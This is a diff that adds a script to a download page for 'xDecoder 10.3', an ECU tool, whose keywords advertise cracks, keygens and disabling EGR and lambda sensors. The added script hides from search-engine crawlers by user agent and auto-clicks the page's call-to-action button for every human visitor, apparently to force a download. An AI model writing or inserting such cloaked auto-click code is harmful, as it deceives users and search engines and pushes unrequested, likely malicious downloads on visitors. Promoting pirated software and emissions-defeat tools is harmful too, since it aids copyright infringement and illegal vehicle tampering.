@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>xDecoder 10.3</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download xDecoder 10.3 software tool for removing ECU errors and disable sensors. Supports various hardware and operating systems.">
     <meta name="keywords" content="xDecoder 10.3, xDecoder software tool, xDecoder tool download, xDecoder software download, xDecoder free download, xDecoder crack, xDecoder keygen, xDecoder diagnostic software, xDecoder for KESS, xDecoder for KTAG, xDecoder for PCMTUNER, xDecoder for KT200, xDecoder for FoxFlash, xDecoder ECU removal, xDecoder remove errors, xDecoder disable lambda sensor, xDecoder disable EGR, xDecoder ECU firmware, xDecoder checksum calculation, xDecoder for windows 11, xDecoder for windows 10, xDecoder for windows 7, xDecoder Alfa Romeo, xDecoder Fiat, xDecoder Lancia, xDecoder BMW, xDecoder Chery, xDecoder Chevrolet, xDecoder Citroen, xDecoder Peugeot, xDecoder Dodge, xDecoder Ford, xDecoder Mazda, xDecoder Honda, xDecoder Hyundai, xDecoder Kia, xDecoder Isuzu, xDecoder Iveco, xDecoder Jeep, xDecoder Land Rover, xDecoder Man, xDecoder Maserati, xDecoder Mercedes, xDecoder Mini, xDecoder Opel, xDecoder Vauxhall, xDecoder Porsche, xDecoder Renault, xDecoder Nissan, xDecoder Smart, xDecoder Subaru, xDecoder Suzuki, xDecoder VAG, xDecoder Volvo, скачать xDecoder, бесплатно загрузить xDecoder, ключ для xDecoder, xDecoder программа, диагностическое программное обеспечение xDecoder, программное обеспечение xDecoder скачать, ключ xDecoder, xDecoder зняття помилок, xDecoder прошивки ECU, xDecoder скачати безплатно, безплатно завантажити xDecoder, xDecoder crack скачать, xDecoder keygen скачать">
     <style>
